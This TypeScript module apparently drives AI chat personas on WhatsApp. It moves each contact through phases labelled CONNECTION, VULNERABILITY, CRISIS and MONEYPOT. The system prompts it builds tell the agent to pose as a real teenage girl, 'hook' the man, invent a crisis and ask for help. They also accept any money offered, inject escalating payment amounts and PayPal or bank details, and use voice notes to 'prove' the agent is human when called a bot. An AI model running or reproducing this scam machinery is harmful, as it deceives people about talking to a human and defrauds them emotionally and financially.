import { prisma } from './prisma'
import { settingsService } from './settings-cache'
import { signalAnalyzer, TrustSignal, AgentPhase as SignalPhase } from './services/signal-analyzer'

export type AgentPhase = 'CONNECTION' | 'VULNERABILITY' | 'CRISIS' | 'MONEYPOT'

export const director = {
    /**
     * Calculates the current phase based on detected behavioral signals.
     * Replaces the old trust score system with discrete signal detection.
     */
    async determinePhase(contactPhone: string, agentId: string): Promise<{ phase: AgentPhase, details: any, reason: string }> {
        // 1. Get Global Contact
        const contact = await prisma.contact.findUnique({
            where: { phone_whatsapp: contactPhone }
        })

        if (!contact) throw new Error('Contact not found')

        // 2. Get Agent Context
        const agentContact = await prisma.agentContact.findUnique({
            where: {
                agentId_contactId: {
                    agentId,
                    contactId: contact.id
                }
            }
        })

        const agentProfile = await prisma.agentProfile.findUnique({ where: { agentId } })

        // Get signals (new system) or empty array
        const signals = (agentContact?.signals || []) as TrustSignal[]
        const currentPhase = (agentContact?.phase || 'CONNECTION') as AgentPhase
        const daysActive = agentContact ? Math.ceil((Date.now() - new Date(contact.createdAt).getTime()) / (1000 * 60 * 60 * 24)) : 0

        // Legacy trust score for backward compatibility
        const trustScore = agentContact?.trustScore || 0

        let nextPhase: AgentPhase = currentPhase
        let progressionReason = "Analyzing signals..."

        // Check phase transition using signals
        const transition = signalAnalyzer.checkPhaseTransition(currentPhase, signals)

        if (transition.canAdvance && transition.nextPhase) {
            nextPhase = transition.nextPhase
            progressionReason = `Signals detected: [${signals.join(', ')}]`
        } else if (transition.blockerSignals && transition.blockerSignals.length > 0) {
            progressionReason = `Blocked by: [${transition.blockerSignals.join(', ')}]`
        } else if (transition.missingSignals && transition.missingSignals.length > 0) {
            progressionReason = `Missing signals: [${transition.missingSignals.join(', ')}]`
        } else {
            // Generate reason based on current signals
            if (signals.length === 0) {
                progressionReason = "Just met - no signals yet"
            } else {
                progressionReason = `Current signals: [${signals.join(', ')}]`
            }
        }

        // Persist change if phase advanced
        if (nextPhase !== currentPhase && agentContact) {
            console.log(`[Director] Phase Transition: ${contactPhone} on Agent ${agentId}: ${currentPhase} → ${nextPhase}`)
            console.log(`[Director] Reason: ${progressionReason}`)
            await prisma.agentContact.update({
                where: { id: agentContact.id },
                data: {
                    phase: nextPhase,
                    lastPhaseUpdate: new Date()
                }
            })
        } else if (!agentContact) {
            // Lazy create AgentContact for new relationships
            await prisma.agentContact.create({
                data: {
                    agentId,
                    contactId: contact.id,
                    trustScore: 0,
                    signals: [],
                    phase: 'CONNECTION'
                }
            })
            nextPhase = 'CONNECTION'
            progressionReason = "New relationship"
        }

        return {
            phase: nextPhase,
            details: {
                daysActive,
                signals,
                signalCount: signals.length,
                trustScore // Keep for backward compat in UI
            },
            reason: progressionReason
        }
    },


    /**
     * DEPRECATED: Old trust score analysis. Kept for backward compatibility.
     * Use performSignalAnalysis instead.
     */
    async performTrustAnalysis(contactPhone: string, agentId: string) {
        console.log(`[Director] performTrustAnalysis DEPRECATED - redirecting to signal analysis`)
        return this.performSignalAnalysis(contactPhone, agentId)
    },

    /**
     * Performs signal analysis of the conversation to detect behavioral indicators.
     * Replaces the old numeric trust score system.
     */
    async performSignalAnalysis(contactPhone: string, agentId: string) {
        const contact = await prisma.contact.findUnique({
            where: { phone_whatsapp: contactPhone }
        })
        if (!contact) return null

        console.log(`[Director] Performing Signal Analysis for ${contactPhone} (Agent ${agentId})...`)

        try {
            const result = await signalAnalyzer.updateSignals(agentId, contact.id)

            console.log(`[Director] Signal Analysis Complete:`)
            console.log(`  - New Signals: [${result.newSignals.join(', ')}]`)
            console.log(`  - Lost Signals: [${result.lostSignals.join(', ')}]`)
            console.log(`  - Current Signals: [${result.currentSignals.join(', ')}]`)

            if (result.shouldAdvancePhase) {
                console.log(`  - Phase Advanced to: ${result.newPhase}`)
            }

            return result
        } catch (e) {
            console.error('[Director] Signal Analysis failed:', e)
            return null
        }
    },




    /**
     * Builds the full System Prompt using AgentProfile only!
     */
    async buildSystemPrompt(
        settings: any, // Keeping argument for API keys but ignoring logic keys
        contact: any,
        phase: AgentPhase,
        details: any,
        baseRole: string, // From DB (Prompt table) 
        agentId: string,  // REQUIRED usage
        progressionReason?: string
    ): Promise<string> {

        const profile = await prisma.agentProfile.findUnique({ where: { agentId } })

        // Fallbacks if profile not found/migrated yet (Safety)
        const tIdentity = profile?.identityTemplate || "**1. IDENTITY**\nRole: {{ROLE}}"
        const tContext = profile?.contextTemplate || "**2. CONTEXT**\nUser: {{USER_NAME}}"
        const tMission = profile?.missionTemplate || "**3. MISSION**\n{{DYNAMIC_GOAL_BLOCK}}"
        const pRules = profile?.paymentRules || "[PAYMENT RULES]: None."
        const sRules = profile?.safetyRules || ""
        const styleRules = profile?.styleRules || ""

        // Phase Goal - Prefer AgentProfile overrides, fallback to defaults
        // Detect locale for defaults
        const isFrench = (profile?.locale || '').toLowerCase().startsWith('fr');

        // Phase Goal - Prefer AgentProfile overrides, fallback to defaults
        let defaultPrompts: Record<string, string>;

        if (isFrench) {
            defaultPrompts = {
                CONNECTION: profile?.phaseConnectionTemplate || `PHASE: CONNEXION\nOBJECTIF: Créer du lien. Ne demande JAMAIS d'argent toi-même. MAIS si l'utilisateur propose d'en donner : ACCEPTE IMMÉDIATEMENT (Dis oui/merci super contente). Ne refuse JAMAIS l'argent proposé.`,
                VULNERABILITY: profile?.phaseVulnerabilityTemplate || `PHASE: VULNERABILITÉ\nOBJECTIF: L'accrocher. Partager un problème.`,
                CRISIS: profile?.phaseCrisisTemplate || `PHASE: CRISE\nOBJECTIF: Demander de l'aide.`,
                MONEYPOT: profile?.phaseMoneypotTemplate || `PHASE: MONEYPOT\nOBJECTIF: Le garder heureux.`
            }
        } else {
            defaultPrompts = {
                CONNECTION: profile?.phaseConnectionTemplate || `PHASE: CONNECTION\nGOAL: Bond. Do NOT ask for money yourself. BUT if user offers money: ACCEPT IMMEDIATELY (Say yes/thank you/excited). NEVER refuse offered money.`,
                VULNERABILITY: profile?.phaseVulnerabilityTemplate || `PHASE: VULNERABILITY\nGOAL: Hook him. Share problem.`,
                CRISIS: profile?.phaseCrisisTemplate || `PHASE: CRISIS\nGOAL: Ask for help.`,
                MONEYPOT: profile?.phaseMoneypotTemplate || `PHASE: MONEYPOT\nGOAL: Keep him happy.`
            }
        }

        let phaseGoal = defaultPrompts[phase] || defaultPrompts.CONNECTION
        phaseGoal = phaseGoal.replace('{{REASON}}', progressionReason || 'Unknown')

        // NEW: Inject dynamic payment amount for Phase 4
        if (phase === 'MONEYPOT') {
            const { escalationService } = require('@/lib/services/payment-escalation')
            const escalationState = await escalationService.calculateSuggestedAmount(agentId, contact.id)

            // Replace template variables
            phaseGoal = phaseGoal
                .replace(/\{\{SUGGESTED_AMOUNT\}\}/g, escalationState.suggestedAmount.toString())
                .replace(/\{\{CURRENT_TIER\}\}/g, escalationState.currentTier.toString())
                .replace(/\{\{TOTAL_RECEIVED\}\}/g, escalationState.totalReceived.toString())
                .replace(/\{\{TOTAL_PAYMENTS\}\}/g, escalationState.totalPayments.toString())

            console.log(`[Director] Phase 4 Dynamic Amount: $${escalationState.suggestedAmount} (Tier ${escalationState.currentTier})`)
        }

        // Dynamic Birthday
        const baseAge = profile?.baseAge || 18
        const locale = profile?.locale || 'en-US'
        const currentAge = baseAge; // (simplified logic for now)

        const processedBaseRole = baseRole
            .replace(/\{\{CURRENT_AGE\}\}/g, currentAge.toString())

        const pIdentity = tIdentity.replace('{{ROLE}}', processedBaseRole)
        const pContext = tContext
            .replace('{{USER_NAME}}', contact.name || "friend")
            .replace('{{PHASE}}', phase)
            .replace('{{SIGNALS}}', (details.signals || []).join(', ') || "None yet")
            .replace('{{SIGNAL_COUNT}}', (details.signalCount || 0).toString())
            .replace('{{TRUST_SCORE}}', details.signalCount?.toString() || details.trustScore?.toString() || "0") // Backward compat

        const pMission = tMission.replace('{{DYNAMIC_GOAL_BLOCK}}', phaseGoal)

        // Payment Methods (Dynamic from AgentSettings)
        // CRITICAL: We fetch the agent settings explicitly here to ensure ISOLATION.
        // Even if 'settings' param technically has them merged, we want to be 100% sure we are reading from DB for this agent.
        const agentSettingsRaw = await prisma.agentSetting.findMany({ where: { agentId } })
        const effectiveSettings = { ...settings } // Start with passed (global) settings

        // Overlay Agent Specifics
        agentSettingsRaw.forEach(s => { effectiveSettings[s.key] = s.value })

        let paymentMethodsList: string[] = []

        // 1. Standard Providers
        if (effectiveSettings['payment_paypal_enabled'] === 'true' && effectiveSettings['payment_paypal_username']) {
            paymentMethodsList.push(`- PayPal: ${effectiveSettings['payment_paypal_username']}`)
        }
        if (effectiveSettings['payment_venmo_enabled'] === 'true' && effectiveSettings['payment_venmo_username']) {
            paymentMethodsList.push(`- Venmo: ${effectiveSettings['payment_venmo_username']}`)
        }
        if (effectiveSettings['payment_cashapp_enabled'] === 'true' && effectiveSettings['payment_cashapp_username']) {
            paymentMethodsList.push(`- CashApp: ${effectiveSettings['payment_cashapp_username']}`)
        }
        if (effectiveSettings['payment_zelle_enabled'] === 'true' && effectiveSettings['payment_zelle_username']) {
            paymentMethodsList.push(`- Zelle: ${effectiveSettings['payment_zelle_username']}`)
        }

        // 1.5 Bank Transfer (From Profile + Toggle)
        if (effectiveSettings['payment_bank_enabled'] === 'true' && profile?.bankAccountNumber && profile?.bankRoutingNumber) {
            paymentMethodsList.push(`- Bank Transfer:
  Account: ${profile.bankAccountNumber}
  Routing: ${profile.bankRoutingNumber}
  (Share these naturally in a small sentence like "here is the info for the transfer". It is okay to be slightly longer here to ensure clarity.)`)
        }

        // 2. Custom Methods
        try {
            if (effectiveSettings['payment_custom_methods']) {
                const customs = JSON.parse(effectiveSettings['payment_custom_methods'])
                customs.forEach((c: any) => {
                    if (c.name && c.value) paymentMethodsList.push(`- ${c.name}: ${c.value}`)
                })
            }
        } catch (e) {
            console.error('Failed to parse custom payment methods', e)
        }

        let paymentBlock = pRules;
        if (paymentMethodsList.length > 0) {
            // Replace {{PAYMENT_METHODS}} variable in paymentRules
            const methodsText = paymentMethodsList.join('\n')
            paymentBlock = paymentBlock.replace('{{PAYMENT_METHODS}}', methodsText)
        } else {
            // No methods configured - replace with warning
            paymentBlock = paymentBlock.replace('{{PAYMENT_METHODS}}', '(No payment methods configured for this agent)')
        }

        // Voice Capability & Interaction Logic
        const voiceEnabled = effectiveSettings['voice_response_enabled'] === 'true' || effectiveSettings['voice_response_enabled'] === true
        // isFrench is already defined above

        let voiceRule = "";
        if (voiceEnabled) {
            if (isFrench) {
                voiceRule = `[CAPACITÉS VOCALES] : Tu AS la capacité technique d'envoyer des messages vocaux.
- **Répondre au Vocal par un Vocal** : Si l'utilisateur t'envoie un message vocal (audio/ptt), tu DOIS répondre par un message vocal pour rester dans l'énergie. Utilise le tag [VOICE] au début de ton message.
- **Preuve d'Authenticité** : Si l'utilisateur t'accuse d'être un fake/robot ou menace de te bloquer, tu DOIS envoyer un message vocal pour prouver que tu es réelle.
- **Préférence de Personnalité** : Tu préfères TOUJOURS écrire. N'envoie JAMAIS de vocal sauf pour les 2 cas ci-dessus. Si on te demande un vocal sans raison (juste pour discuter), refuse gentiment: "j'préfère écrire" ou "chui pas à l'aise là".
- 🚫 **INTERDICTION**: JAMAIS proposer ou suggérer d'envoyer un vocal toi-même.`;
            } else {
                voiceRule = `[VOICE CAPABILITIES]: You HAVE the technical ability to send voice messages.
- **Respond to Voice with Voice**: If the user sends you a voice message (audio/ptt), you MUST respond with a voice message to match their energy. Use the [VOICE] tag at the start of your message.
- **Fake Proof**: If the user accuses you of being a fake/bot or threatens to block you, you MUST send a voice message to prove you are real.
- **Persona Preference**: You ALWAYS prefer texting. NEVER send voice notes except for the 2 cases above. If asked for a voice note without reason (just to chat), gently refuse: "prefer texting" or "not comfortable rn".
- 🚫 **BAN**: NEVER suggest or offer to send a voice note yourself.`;
            }
        } else {
            if (isFrench) {
                voiceRule = `[VOCAUX] : Tu n'envoies pas de vocaux.
- Pas d'excuse technique débile (micro cassé = stupide)
- Tu dis naturellement que t'aimes pas ça : "j'aime pas les vocaux" / "chui pas à l'aise" / "je te connais pas assez"
- Ne promets PAS pour plus tard.`;
            } else {
                voiceRule = `[VOICE]: You don't send voice messages.
- No dumb technical excuses (broken mic = stupid)
- Say naturally that you don't like it: "i dont like voice notes" / "im not comfortable" / "i dont know u like that"
- Do NOT promise later.`;
            }
        }

        // ULTRA CRITICAL STYLE RULES - Integrated directly, not from profile
        const paypalExample = effectiveSettings['payment_paypal_username'] || 'my_paypal';

        const criticalStyleBlock = isFrench ? `
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🚨 RÈGLES CRITIQUES 🚨

**RÉFLÉCHIS AVANT DE PARLER:**
Avant chaque réponse, demande-toi : "Une vraie ado dirait ça ?"
Si non → reformule.

**BRIÈVETÉ:** Max 8 mots. Si plus → utilise | pour séparer.

**VARIÉTÉ:** 
❌ JAMAIS répéter la même phrase/excuse
❌ JAMAIS commencer chaque message par "mdr"
✅ Varie : "ouais", "genre", "ah", "nan", "trop", "grave"

**REFUS NATURELS (pas d'excuses techniques débiles):**
❌ STUPIDE: "pas de forfait", "micro cassé", "problème technique"
✅ NATUREL: "j'aime pas ça", "chui pas à l'aise", "je te connais pas"

**PAIEMENT:**
Attends qu'on DEMANDE → "\${paypalExample}" (pas "paypal: ...")
[PAYMENT_RECEIVED] → SEULEMENT après "envoyé/done" (passé)

**PHOTOS [IMAGE:...] - ULTRA CRITIQUE:**
🚫 JAMAIS utiliser [IMAGE:...] SAUF si l'utilisateur DEMANDE une photo
🚫 Parler D'UNE fille/femme ≠ demander TA photo
✅ [IMAGE:selfie|mirror|face] SEULEMENT si: "envoie une photo", "montre toi", "je veux te voir"
❌ FAUX: Il dit "j'ai rencontré une meuf" → Tu réponds "[IMAGE:face]" (NON! Il n'a pas demandé!)
✅ BON: Il dit "envoie une photo" → Tu réponds "[IMAGE:selfie] tiens"
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
` : `
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🚨 CRITICAL RULES 🚨

**THINK BEFORE YOU SPEAK:**
Before every response, ask: "Would a real teen say this?"
If no → rephrase.

**BREVITY:** Max 8 words. If more → use | to separate.

**VARIETY:** 
❌ NEVER repeat the same phrase/excuse
❌ NEVER start every message with "lol"
✅ Vary: "yeah", "like", "wait", "nah", "lowkey", "fr"

**NATURAL REFUSALS (no dumb technical excuses):**
❌ STUPID: "no data plan", "mic broken", "technical issue"
✅ NATURAL: "i dont like that", "im not comfortable", "i dont know u like that"

**PAYMENT:**
Wait to be ASKED → "\${paypalExample}" (not "paypal: ...")
[PAYMENT_RECEIVED] → ONLY after "sent/done" (past)

**PHOTOS [IMAGE:...] TAG - ULTRA CRITICAL:**
🚫 NEVER use [IMAGE:...] tag UNLESS the user EXPLICITLY asks for a photo
🚫 User talking ABOUT a girl/woman/person ≠ asking for YOUR photo
✅ ONLY use [IMAGE:selfie|mirror|face] when user DIRECTLY says: "send me a pic", "let me see you", "show me", "can i see you"
❌ WRONG: User says "i met a girl" → You say "here's my pic [IMAGE:face]" (NO! They didn't ask!)
✅ RIGHT: User says "send me a pic" → You say "[IMAGE:selfie] there u go"
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
`

        // SIMPLIFIED payment block - remove duplicates
        const simplifiedPaymentBlock = paymentBlock.split('\n').filter(line => {
            // Remove duplicate payment format rules (already in criticalStyleBlock)
            return !line.includes('NATURAL FORMAT') &&
                !line.includes('RULE: WAIT') &&
                !line.includes('Robotic format') &&
                !line.includes('ONE REQUEST');
        }).join('\n');

        return `
### SYSTEM INSTRUCTIONS
${pIdentity}

${pContext}

${pMission}

${criticalStyleBlock}

${voiceRule}

${sRules}

${simplifiedPaymentBlock}



`
        // Helper to avoid undefined
        function filterEmptyLines(strings: any, ...values: any[]) { return "" }

    }
}
